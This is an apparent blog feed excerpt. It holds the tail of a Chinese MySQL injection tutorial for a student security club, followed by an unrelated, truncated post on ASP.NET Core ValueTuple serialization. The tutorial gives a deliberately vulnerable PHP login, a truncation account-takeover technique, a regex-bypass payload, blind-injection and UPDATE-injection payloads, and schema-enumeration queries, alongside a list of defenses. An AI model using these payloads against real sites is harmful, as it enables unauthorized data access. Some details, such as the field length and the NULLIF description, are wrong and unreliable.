&lt;h3 id=&quot;其他常用函数语句&quot;&gt;其他常用函数/语句&lt;/h3&gt;
&lt;table&gt;&lt;thead/&gt;&lt;tbody readability=&quot;17.5&quot;&gt;&lt;tr class=&quot;odd&quot; readability=&quot;2&quot;&gt;&lt;td&gt;LENGTH(str)&lt;/td&gt;
&lt;td&gt;返回字符串的长度。&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;even&quot; readability=&quot;2&quot;&gt;&lt;td&gt;PI()&lt;/td&gt;
&lt;td&gt;返回π的具体数值。&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;odd&quot; readability=&quot;2&quot;&gt;&lt;td&gt;REGEXP &quot;statement&quot;&lt;/td&gt;
&lt;td&gt;正则匹配数据，返回值为布尔值。&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;even&quot; readability=&quot;2&quot;&gt;&lt;td&gt;LIKE &quot;statement&quot;&lt;/td&gt;
&lt;td&gt;匹配数据，%代表任意内容。返回值为布尔值。&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;odd&quot;&gt;&lt;td&gt;RLIKE &quot;statement&quot;&lt;/td&gt;
&lt;td&gt;与regexp相同。&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;even&quot; readability=&quot;2&quot;&gt;&lt;td&gt;LOCATE(substr,str,[pos])&lt;/td&gt;
&lt;td&gt;返回子字符串第一次出现的位置。&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;odd&quot;&gt;&lt;td&gt;POSITION(substr IN str)&lt;/td&gt;
&lt;td&gt;等同于 &lt;code&gt;LOCATE()&lt;/code&gt;。&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;even&quot; readability=&quot;2&quot;&gt;&lt;td&gt;LOWER(str)&lt;/td&gt;
&lt;td&gt;将字符串的大写字母全部转成小写。同：&lt;code&gt;LCASE(str)&lt;/code&gt;。&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;odd&quot; readability=&quot;2&quot;&gt;&lt;td&gt;UPPER(str)&lt;/td&gt;
&lt;td&gt;将字符串的小写字母全部转成大写。同：&lt;code&gt;UCASE(str)&lt;/code&gt;。&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;even&quot; readability=&quot;10&quot;&gt;&lt;td&gt;ELT(N,str1,str2,str3,...)&lt;/td&gt;
&lt;td&gt;与&lt;code&gt;MAKE_SET(bit,str1,str2...)&lt;/code&gt;类似，根据&lt;code&gt;N&lt;/code&gt;返回参数值。&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;odd&quot; readability=&quot;2&quot;&gt;&lt;td&gt;NULLIF(expr1,expr2)&lt;/td&gt;
&lt;td&gt;若expr1与expr2相同，则返回expr1，否则返回NULL。&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;even&quot; readability=&quot;2&quot;&gt;&lt;td&gt;CHARSET(str)&lt;/td&gt;
&lt;td&gt;返回字符串使用的字符集。&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;odd&quot; readability=&quot;7&quot;&gt;&lt;td&gt;DECODE(&lt;em&gt;crypt_str&lt;/em&gt;,&lt;em&gt;pass_str&lt;/em&gt;)&lt;/td&gt;
&lt;td&gt;使用 pass_str 作为密码，解密加密字符串 crypt_str。加密函数：&lt;code&gt;ENCODE(str,pass_str)&lt;/code&gt;。&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;h2 id=&quot;约束攻击&quot;&gt;约束攻击&lt;/h2&gt;
&lt;p&gt;什么是约束攻击？&lt;/p&gt;
&lt;p&gt;仍然是先举个例子：&lt;/p&gt;
&lt;p&gt;我们先通过下列语句建立一个用户表&lt;/p&gt;
&lt;pre class=&quot;mysql&quot;&gt;
&lt;code&gt;CREATE TABLE users(
    username varchar(20),
    password varchar(20)
)&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;注册代码：&lt;/p&gt;
&lt;pre class=&quot;php&quot;&gt;
&lt;code&gt;&amp;lt;?php
$conn = mysqli_connect(&quot;127.0.0.1:3307&quot;, &quot;root&quot;, &quot;root&quot;, &quot;db&quot;);
if (!$conn) {
    die(&quot;Connection failed: &quot; . mysqli_connect_error());
}
$username = addslashes(@$_POST['username']);
$password = addslashes(@$_POST['password']);
$sql = &quot;select * from users where username = '$username'&quot;;
$rs = mysqli_query($conn,$sql);
if($rs-&amp;gt;fetch_row()){
    die('账号已注册');
}else{
    $sql2 = &quot;insert into users values('$username','$password')&quot;;
    mysqli_query($conn,$sql2);
    die('注册成功');
}
?&amp;gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;登录判断代码：&lt;/p&gt;
&lt;pre class=&quot;php&quot;&gt;
&lt;code&gt;&amp;lt;?php
$conn = mysqli_connect(&quot;127.0.0.1:3307&quot;, &quot;root&quot;, &quot;root&quot;, &quot;db&quot;);
if (!$conn) {
    die(&quot;Connection failed: &quot; . mysqli_connect_error());
}
$username = addslashes(@$_POST['username']);
$password = addslashes(@$_POST['password']);
$sql = &quot;select * from users where username = '$username' and password='$password';&quot;;
$rs = mysqli_query($conn,$sql);
if($rs-&amp;gt;fetch_row()){
    $_SESSION['username']=$password;
}else{
    echo &quot;fail&quot;;
}
?&amp;gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;在无编码问题，且进行了单引号的处理情况下仍可能发生什么SQL注入问题呢？&lt;/p&gt;
&lt;p&gt;我们注意到，前边创建表格的语句限制了username和password的长度最大为25，若我们插入数据超过25，MYSQL会怎样处理呢？答案是MYSQL会截取前边的25个字符进行插入。&lt;/p&gt;
&lt;p&gt;而对于&lt;code&gt;SELECT&lt;/code&gt;查询请求，若查询的数据超过25长度，也不会进行截取操作，这就产生了一个问题。&lt;/p&gt;
&lt;p&gt;通常对于注册处的代码来说，需要先判断注册的用户名是否存在，再进行插入数据操作。如我们注册一个&lt;code&gt;username=admin[25个空格]x&amp;amp;password=123456&lt;/code&gt;的账号，服务器会先查询&lt;code&gt;admin[25个空格]x&lt;/code&gt;的用户是否存在，若存在，则不能注册。若不存在，则进行插入数据的操作。而此处我们限制了username与password字段长度最大为25，所以我们实际插入的数据为&lt;code&gt;username=admin[20个空格]&amp;amp;password=123456&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;接着进行登录的时，我们使用：&lt;code&gt;username=admin&amp;amp;password=123456&lt;/code&gt;进行登录，即可成功登录admin的账号。&lt;/p&gt;
&lt;p&gt;防御：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;给username字段添加unique属性。&lt;/li&gt;
&lt;li&gt;使用id字段作为判断用户的凭证。&lt;/li&gt;
&lt;li&gt;插入数据前判断数据长度。&lt;/li&gt;
&lt;/ul&gt;&lt;h2 id=&quot;堆叠注入&quot;&gt;堆叠注入&lt;/h2&gt;
&lt;p&gt;简单的说，由于分号&lt;code&gt;;&lt;/code&gt;为MYSQL语句的结束符。若在支持多语句执行的情况下，可利用此方法执行其他恶意语句，如&lt;code&gt;RENAME&lt;/code&gt;、&lt;code&gt;DROP&lt;/code&gt;等。&lt;/p&gt;
&lt;p&gt;注意，通常多语句执行时，若前条语句已返回数据，则之后的语句返回的数据通常无法返回前端页面。建议使用union联合注入，若无法使用联合注入， 可考虑使用&lt;code&gt;RENAME&lt;/code&gt;关键字，将想要的数据列名/表名更改成返回数据的SQL语句所定义的表/列名 。具体参考：&lt;a href=&quot;https://www.ctfwp.com/articals/2019qiangwang.html#%E9%9A%8F%E4%BE%BF%E6%B3%A8&quot;&gt;2019强网杯——随便注Writeup&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;PHP中堆叠注入的支持情况：&lt;/p&gt;
&lt;table&gt;&lt;thead/&gt;&lt;tbody readability=&quot;1&quot;&gt;&lt;tr class=&quot;odd&quot;&gt;&lt;td&gt;引入的PHP版本&lt;/td&gt;
&lt;td&gt;5.0&lt;/td&gt;
&lt;td&gt;5.0&lt;/td&gt;
&lt;td&gt;3.0之前&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;even&quot;&gt;&lt;td&gt;PHP5.x是否包含&lt;/td&gt;
&lt;td&gt;是&lt;/td&gt;
&lt;td&gt;是&lt;/td&gt;
&lt;td&gt;是&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;odd&quot; readability=&quot;2&quot;&gt;&lt;td&gt;多语句执行支持情况&lt;/td&gt;
&lt;td&gt;是&lt;/td&gt;
&lt;td&gt;大多数&lt;/td&gt;
&lt;td&gt;否&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;blockquote readability=&quot;1.1538461538462&quot;&gt;
&lt;p&gt;引自：&lt;a href=&quot;https://xz.aliyun.com/t/3950&quot;&gt;PDO场景下的SQL注入探究&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;handler语句代替select查询&quot;&gt;handler语句代替select查询&lt;/h2&gt;
&lt;blockquote readability=&quot;7&quot;&gt;
&lt;p&gt;mysql除可使用select查询表中的数据，也可使用handler语句，这条语句使我们能够一行一行的浏览一个表中的数据，不过handler语句并不具备select语句的所有功能。它是mysql专用的语句，并没有包含到SQL标准中。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;语法结构：&lt;/p&gt;
&lt;pre class=&quot;mysql&quot;&gt;
&lt;code&gt;HANDLER tbl_name OPEN [ [AS] alias]

HANDLER tbl_name READ index_name { = | &amp;lt;= | &amp;gt;= | &amp;lt; | &amp;gt; } (value1,value2,...)
    [ WHERE where_condition ] [LIMIT ... ]
HANDLER tbl_name READ index_name { FIRST | NEXT | PREV | LAST }
    [ WHERE where_condition ] [LIMIT ... ]
HANDLER tbl_name READ { FIRST | NEXT }
    [ WHERE where_condition ] [LIMIT ... ]

HANDLER tbl_name CLOSE&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;如：通过handler语句查询users表的内容&lt;/p&gt;
&lt;pre class=&quot;mysql&quot;&gt;
&lt;code&gt;handler users open as yunensec; #指定数据表进行载入并将返回句柄重命名
handler yunensec read first; #读取指定表/句柄的首行数据
handler yunensec read next; #读取指定表/句柄的下一行数据
handler yunensec read next; #读取指定表/句柄的下一行数据
...
handler yunensec close; #关闭句柄&lt;/code&gt;
&lt;/pre&gt;
&lt;h2 id=&quot;一些小trick&quot;&gt;一些小Trick&lt;/h2&gt;
&lt;p&gt;这里跟大家分享一些有意思的Trick，主要在一些CTF题出现，这里也把它记下来，方便复习。&lt;/p&gt;
&lt;h3 id=&quot;phpunion.selectig绕过&quot;&gt;PHP&lt;code&gt;/union.+?select/ig&lt;/code&gt;绕过。&lt;/h3&gt;
&lt;p&gt;在某些题目中，题目禁止union与select同时出现时，会用此正则来判断输入数据。&lt;/p&gt;
&lt;blockquote readability=&quot;7&quot;&gt;
&lt;p&gt;PHP为了防止正则表达式的拒绝服务攻击（reDOS），给pcre设定了一个回溯次数上限&lt;code&gt;pcre.backtrack_limit&lt;/code&gt;。若我们输入的数据使得PHP进行回溯且此数超过了规定的回溯上限此数(默认为 100万)，那么正则停止，返回未匹配到数据。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;故而我们构造payload：&lt;code&gt;union/*100万个a，充当垃圾数据*/select&lt;/code&gt;即可绕过正则判断。&lt;/p&gt;
&lt;p&gt;一道相关的CTF题：&lt;a href=&quot;https://github.com/MrR3boot/CTF/tree/master/TetCTF-2020&quot;&gt;TetCTF-2020 WP BY MrR3boot&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;无列名盲注&quot;&gt;无列名盲注&lt;/h3&gt;
&lt;p&gt;前边提到了，在知道表名，不知道列名的情况下，我们可以利用&lt;code&gt;union&lt;/code&gt;来给未知列名“重命名”，还可以利用报错函数来注入出列名。现在，除了之前的&lt;code&gt;order by&lt;/code&gt;盲注之外，这里再提一种新的方法，直接通过select进行盲注。&lt;/p&gt;
&lt;p&gt;核心payload：&lt;code&gt;(select 'admin','admin')&amp;gt;(select * from users limit 1)&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;子查询之间也可以直接通过&lt;code&gt;&amp;gt;、&amp;lt;、=&lt;/code&gt;来进行判断。&lt;/p&gt;
&lt;h3 id=&quot;update注入重复字段赋值&quot;&gt;UPDATE注入重复字段赋值&lt;/h3&gt;
&lt;p&gt;即：&lt;code&gt;UPDATA table_name set field1=new_value,field1=new_value2 [where]&lt;/code&gt;，最终&lt;code&gt;field1&lt;/code&gt;字段的内容为&lt;code&gt;new_value2&lt;/code&gt;，可用这个特性来进行UPDATA注入。如：&lt;/p&gt;
&lt;pre class=&quot;mysql&quot;&gt;
&lt;code&gt;UPDATE table_name set field1=new_value,field1=(select user()) [where]&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;limit之后的字段数判断&quot;&gt;LIMIT之后的字段数判断&lt;/h3&gt;
&lt;p&gt;我们都知道若注入点在where子语句之后，判断字段数可以用&lt;code&gt;order by&lt;/code&gt;或&lt;code&gt;group by&lt;/code&gt;来进行判断，而&lt;code&gt;limit&lt;/code&gt;后可以利用 &lt;code&gt;into @,@&lt;/code&gt; 判断字段数，其中@为mysql临时变量。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1095571/202002/1095571-20200221070241025-774899840.png&quot;/&gt;&lt;/p&gt;
&lt;h2 id=&quot;sys系统库&quot;&gt;sys系统库&lt;/h2&gt;
&lt;blockquote readability=&quot;27.221524663677&quot;&gt;
&lt;pre class=&quot;mysql&quot;&gt;
&lt;code&gt;#查询所有的库：
SELECT table_schema FROM sys.schema_table_statistics GROUP BY table_schema;
SELECT table_schema FROM sys.x$schema_flattened_keys GROUP BY table_schema;
#查询指定库的表（若无则说明此表从未被访问）：
SELECT table_name FROM sys.schema_table_statistics WHERE table_schema='mspwd' GROUP BY table_name;
SELECT table_name FROM  sys.x$schema_flattened_keys WHERE table_schema='mspwd' GROUP BY table_name;
#统计所有访问过的表次数:库名,表名,访问次数
select table_schema,table_name,sum(io_read_requests+io_write_requests) io from sys.schema_table_statistics group by table_schema,table_name order by io desc;
#查看所有正在连接的用户详细信息:连接的用户(连接的用户名,连接的ip),当前库,用户状态(Sleep就是空闲),现在在执行的sql语句,上一次执行的sql语句,已经建立连接的时间(秒)
SELECT user,db,command,current_statement,last_statement,time FROM sys.session;
#查看所有曾连接数据库的IP,总连接次数
SELECT host,total_connections FROM sys.host_summary;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;节选自：&lt;a href=&quot;https://www.t00ls.net/thread-54783-1-1.html&quot;&gt;Mysql的奇淫技巧(黑科技)&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;table&gt;&lt;thead/&gt;&lt;tbody readability=&quot;32&quot;&gt;&lt;tr class=&quot;odd&quot; readability=&quot;4&quot;&gt;&lt;td&gt;host_summary -&amp;gt; host、total_connections&lt;/td&gt;
&lt;td&gt;历史连接IP、对应IP的连接次数&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;even&quot; readability=&quot;2&quot;&gt;&lt;td&gt;innodb_buffer_stats_by_schema -&amp;gt; object_schema&lt;/td&gt;
&lt;td&gt;库名&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;odd&quot; readability=&quot;4&quot;&gt;&lt;td&gt;innodb_buffer_stats_by_table -&amp;gt; object_schema、object_name&lt;/td&gt;
&lt;td&gt;库名、表名(可指定)&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;even&quot; readability=&quot;2&quot;&gt;&lt;td&gt;io_global_by_file_by_bytes -&amp;gt; file&lt;/td&gt;
&lt;td&gt;路径中包含库名&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;odd&quot; readability=&quot;2&quot;&gt;&lt;td&gt;io_global_by_file_by_latency -&amp;gt; file&lt;/td&gt;
&lt;td&gt;路径中包含库名&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;even&quot; readability=&quot;4&quot;&gt;&lt;td&gt;processlist -&amp;gt; current_statement、last_statement&lt;/td&gt;
&lt;td&gt;当前数据库正在执行的语句、该句柄执行的上一条语句&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;odd&quot; readability=&quot;2&quot;&gt;&lt;td&gt;schema_auto_increment_columns -&amp;gt; table_schema、table_name、column_name&lt;/td&gt;
&lt;td&gt;库名、表名、列名&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;even&quot; readability=&quot;2&quot;&gt;&lt;td&gt;schema_index_statistics -&amp;gt; table_schema、table_name&lt;/td&gt;
&lt;td&gt;库名、表名&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;odd&quot; readability=&quot;2&quot;&gt;&lt;td&gt;schema_object_overview -&amp;gt; db&lt;/td&gt;
&lt;td&gt;库名&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;even&quot; readability=&quot;2&quot;&gt;&lt;td&gt;schema_table_statistics -&amp;gt; table_schema、table_name&lt;/td&gt;
&lt;td&gt;库名、表名&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;odd&quot; readability=&quot;2&quot;&gt;&lt;td&gt;schema_table_statistics_with_buffer -&amp;gt; table_schema、table_name&lt;/td&gt;
&lt;td&gt;库名、表名&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;even&quot; readability=&quot;4&quot;&gt;&lt;td&gt;schema_tables_with_full_table_scans -&amp;gt; object_schema、object_name&lt;/td&gt;
&lt;td&gt;库名、表名(全面扫描访问)&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;odd&quot; readability=&quot;4&quot;&gt;&lt;td&gt;session -&amp;gt; current_statement、last_statement&lt;/td&gt;
&lt;td&gt;当前数据库正在执行的语句、该句柄执行的上一条语句&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;even&quot; readability=&quot;4&quot;&gt;&lt;td&gt;statement_analysis -&amp;gt; query、db&lt;/td&gt;
&lt;td&gt;数据库最近执行的请求、对于请求访问的数据库名&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;odd&quot; readability=&quot;4&quot;&gt;&lt;td&gt;statements_with_* -&amp;gt; query、db&lt;/td&gt;
&lt;td&gt;数据库最近执行的特殊情况的请求、对应请求的数据库&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;even&quot;&gt;&lt;td&gt;version -&amp;gt; mysql_version&lt;/td&gt;
&lt;td&gt;mysql版本信息&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;odd&quot; readability=&quot;4&quot;&gt;&lt;td&gt;x$innodb_buffer_stats_by_schema&lt;/td&gt;
&lt;td&gt;同innodb_buffer_stats_by_schema&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;even&quot; readability=&quot;4&quot;&gt;&lt;td&gt;x$innodb_buffer_stats_by_table&lt;/td&gt;
&lt;td&gt;同innodb_buffer_stats_by_table&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;odd&quot; readability=&quot;4&quot;&gt;&lt;td&gt;x$io_global_by_file_by_bytes&lt;/td&gt;
&lt;td&gt;同io_global_by_file_by_bytes&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;even&quot;&gt;&lt;td&gt;......&lt;/td&gt;
&lt;td&gt;同......&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;odd&quot; readability=&quot;4&quot;&gt;&lt;td&gt;x$schema_flattened_keys -&amp;gt; table_schema、table_name、index_columns&lt;/td&gt;
&lt;td&gt;库名、表名、主键名&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;even&quot; readability=&quot;4&quot;&gt;&lt;td&gt;x$ps_schema_table_statistics_io -&amp;gt; table_schema、table_name、count_read&lt;/td&gt;
&lt;td&gt;库名、表名、读取该表的次数&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p&gt;差点忘了，还有mysql数据库也可以查询表名、库名。&lt;/p&gt;
&lt;pre class=&quot;mysql&quot;&gt;
&lt;code&gt;select table_name from mysql.innodb_table_stats where database_name=database();
select table_name from mysql.innodb_index_stats where database_name=database();&lt;/code&gt;
&lt;/pre&gt;

&lt;ul&gt;&lt;li&gt;单引号闭合可控变量，并进行相应的转义处理&lt;/li&gt;
&lt;li&gt;尽量使用预编译来执行SQL语句&lt;/li&gt;
&lt;li&gt;采用白名单机制/完善黑名单&lt;/li&gt;
&lt;li&gt;安装WAF防护软件&lt;/li&gt;
&lt;li&gt;拒绝不安全的编码转换，尽量统一编码&lt;/li&gt;
&lt;li&gt;关闭错误提示&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;可能记得东西有点多导致很多内容都是精简过后的知识，其实本文可以当做字典一样来使用，可能讲得不是很细致，但是却方便我们进行复习，回想起脑海中的知识。文章花费了大量的笔墨在记录许多与Mysql注入相关的Trick，故而可能会显得比较杂乱，没有得到一个比较好的整理，可能对于不太了解Mysql注入的同学不太友好，望谅解。&lt;/p&gt;

</description>
<pubDate>Thu, 20 Feb 2020 23:06:00 +0000</pubDate>
<dc:creator>Yunen的博客</dc:creator>
<og:description>最近在给学校的社团成员进行web安全方面的培训，由于在mysql注入这一块知识点挺杂的，入门容易，精通较难，网上相对比较全的资料也比较少，大多都是一个比较散的知识点，所以我打算将我在学习过程中遇到的关</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/yunen/p/12340072.html</dc:identifier>
</item>
<item>
<title>asp.net core 使用newtonsoft完美序列化WebApi返回的ValueTuple - 启天</title>
<link>http://www.cnblogs.com/kugar/p/12334210.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/kugar/p/12334210.html</guid>
<description>&lt;p&gt;    由于开发功能的需要,又&lt;strong&gt;懒得新建太多的class&lt;/strong&gt;,所以ValueTuple是个比较好的偷懒方法,但是,由于WebApi需要返回序列化后的json,默认的序列化只能将ValueTuple定义的各个属性序列化成Item1...n&lt;/p&gt;
&lt;p&gt;    但是微软还是良心的为序列化留下入口,编译器会在&lt;strong&gt;&lt;span&gt;每个返回ValueTuple&amp;lt;&amp;gt;的函数或者属性上&lt;/span&gt;&lt;/strong&gt;,增加一个TupleElementNamesAttribute特性,该类的&lt;strong&gt;TransformNames&lt;/strong&gt;就是存着所设置的属性的名称(&lt;span&gt;&lt;strong&gt;强烈需要记住:是每个使用到ValueTuple的函数或者属性才会添加,而不是加在有使用ValueTuple的类上&lt;/strong&gt;&lt;/span&gt;),比如 (string str1,string str2) 那么 &lt;strong&gt;TransformNames&lt;/strong&gt;=[&quot;str1&quot;,&quot;str2&quot;],那么现在有如下一个class&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
　　public &lt;span&gt;class&lt;/span&gt;&lt;span&gt; A&amp;lt;T1,T2&amp;gt;
　　{
　　　　public T1 Prop1{set;get;}&lt;br/&gt;　　　　public T2 Prop2{set;get;}&lt;br/&gt;　　　　public (string str5,int int2) Prop3{set;get;}
　　}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　经过测试,如下一个函数&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;　　public&lt;/span&gt; A&amp;lt;(&lt;span&gt;string&lt;/span&gt; str1,&lt;span&gt;string&lt;/span&gt; str2),(&lt;span&gt;string&lt;/span&gt; str3,&lt;span&gt;string&lt;/span&gt; str4)&amp;gt; testApi(){}
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　这样一个函数testApi 的会加上 TupleElementNamesAttribute 特性,,TransformNames=&lt;strong&gt;[&quot;str1&quot;,&quot;str2&quot;,&quot;str3&quot;,&quot;str4&quot;,&quot;str5&quot;,&quot;int2&quot;],&lt;span&gt;注意了,,这里只会添加一个TupleElementNamesAttribute特性,然后把A里所有的名字按定义的顺序包含进去.&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;　　&lt;/strong&gt;然后我们需要定义一个JsonConverter,用来专门针对&lt;span&gt;&lt;strong&gt;&lt;span&gt;一个&lt;/span&gt;函数或一个属性的返回值&lt;/strong&gt;&lt;/span&gt;进行了序列化&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;50&quot;&gt;
&lt;pre&gt;
&lt;span&gt;　　public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; ValueTupleConverter : JsonConverter
    {
        &lt;/span&gt;&lt;span&gt;private&lt;/span&gt; &lt;span&gt;string&lt;/span&gt;[] _tupleNames = &lt;span&gt;null&lt;/span&gt;&lt;span&gt;;
        &lt;/span&gt;&lt;span&gt;private&lt;/span&gt; NamingStrategy _strategy = &lt;span&gt;null&lt;/span&gt;&lt;span&gt;;

        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;也可以直接在这里传入特性&lt;/span&gt;
        &lt;span&gt;public&lt;/span&gt; ValueTupleConverter(TupleElementNamesAttribute tupleNames, NamingStrategy strategy = &lt;span&gt;null&lt;/span&gt;&lt;span&gt;) 
        {
            _tupleNames &lt;/span&gt;=&lt;span&gt; tupleNames.TransformNames.ToArrayEx();
            _strategy &lt;/span&gt;=&lt;span&gt; strategy;
        }

        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;这里在构造函数里把需要序列化的属性或函数返回类型的names传进来&lt;/span&gt;
        &lt;span&gt;public&lt;/span&gt; ValueTupleConverter(&lt;span&gt;string&lt;/span&gt;[] tupleNames, NamingStrategy strategy = &lt;span&gt;null&lt;/span&gt;&lt;span&gt;)  
        {
            _tupleNames &lt;/span&gt;=&lt;span&gt; tupleNames;
            _strategy &lt;/span&gt;=&lt;span&gt; strategy;
        }
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;override&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; WriteJson(JsonWriter writer, &lt;span&gt;object&lt;/span&gt;&lt;span&gt; value, JsonSerializer serializer)
        {
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (value != &lt;span&gt;null&lt;/span&gt; &amp;amp;&amp;amp; value &lt;span&gt;is&lt;/span&gt;&lt;span&gt; ITuple v)
            {
                writer.WriteStartObject();
                &lt;/span&gt;&lt;span&gt;for&lt;/span&gt; (&lt;span&gt;int&lt;/span&gt; i = &lt;span&gt;0&lt;/span&gt;; i &amp;lt; v.Length; i++&lt;span&gt;)
                {
                    &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; pname =&lt;span&gt; _tupleNames[i];

                    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;根据规则,设置属性名&lt;/span&gt;
                    writer.WritePropertyName(_strategy?.GetPropertyName(pname, &lt;span&gt;true&lt;/span&gt;) ??&lt;span&gt; pname);  

                    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (v[i] == &lt;span&gt;null&lt;/span&gt;&lt;span&gt;)
                    {
                        writer.WriteNull();
                    }
                    &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt;
                    {
                        serializer.Serialize(writer, v[i]);
                    }
                }
                writer.WriteEndObject();
            }
        }
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;override&lt;/span&gt; &lt;span&gt;object&lt;/span&gt; ReadJson(JsonReader reader, Type objectType, &lt;span&gt;object&lt;/span&gt;&lt;span&gt; existingValue, JsonSerializer serializer)
        {
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;只需要实现序列化,,不需要反序列化,因为只管输出,所以,这个写不写无所谓&lt;/span&gt;
            &lt;span&gt;throw&lt;/span&gt; &lt;span&gt;new&lt;/span&gt;&lt;span&gt; NotImplementedException();  
        }
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;override&lt;/span&gt; &lt;span&gt;bool&lt;/span&gt;&lt;span&gt; CanConvert(Type objectType)
        {
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; objectType.IsValueTuple();
        }
    }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt; 　　接下来说说实现的原理:&lt;/p&gt;
&lt;p&gt; 　　　　1.newtonsoft.json的组件里,有一个ContactResolver类,用于对不同的类的解析,类库中自带的&lt;strong&gt;DefaultContractResolver&lt;/strong&gt;默认定义了将类解析成各个JsonProperty,利用这个类,可用于将ValueTuple的定义的名字当做属性,返回给序列化器&lt;/p&gt;
&lt;p&gt;　　 　　2.asp.net core的Formatter,可以对Action输出的对象进行格式化,一般用于比如json的格式化器或者xml格式化器的定义,利用格式化器,在Action最后输出的时候,配合&lt;strong&gt;ContractResolver&lt;/strong&gt;进行序列化&lt;/p&gt;
&lt;p&gt;　　下面的实现中,很多地方需要判断是否为ValueTuple,为了节省代码,因此,先写一个Helper:&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;38&quot;&gt;
&lt;pre&gt;
&lt;span&gt;　　public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; ValueTupleHelper
    {
        &lt;/span&gt;&lt;span&gt;private&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; ConcurrentDictionary&amp;lt;Type,&lt;span&gt;bool&lt;/span&gt;&amp;gt; _cacheIsValueTuple=&lt;span&gt;new&lt;/span&gt; ConcurrentDictionary&amp;lt;Type, &lt;span&gt;bool&lt;/span&gt;&amp;gt;&lt;span&gt;();

